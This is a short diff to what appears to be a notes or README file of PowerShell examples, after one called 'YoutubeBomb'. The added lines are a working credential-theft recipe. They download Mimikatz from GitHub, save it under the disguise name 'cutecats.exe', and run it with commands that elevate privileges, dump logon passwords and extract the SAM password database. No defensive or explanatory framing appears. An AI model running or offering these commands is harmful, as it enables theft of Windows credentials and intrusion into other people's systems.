@@ -21,3 +21,9 @@ Example - YoutubeBomb
 If you get the error "The response content cannot be parsed because the Internet  Explorer engine is not available,", Add the following opion:
 
     -UseBasicParsing
+
+Exmple - Download and run Mimikatz
+
+    Invoke-WebRequest -Uri https://github.com/ParrotSec/mimikatz/raw/master/x64/mimikatz.exe -OutFile cutecats.exe
+
+    ./cutecats.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
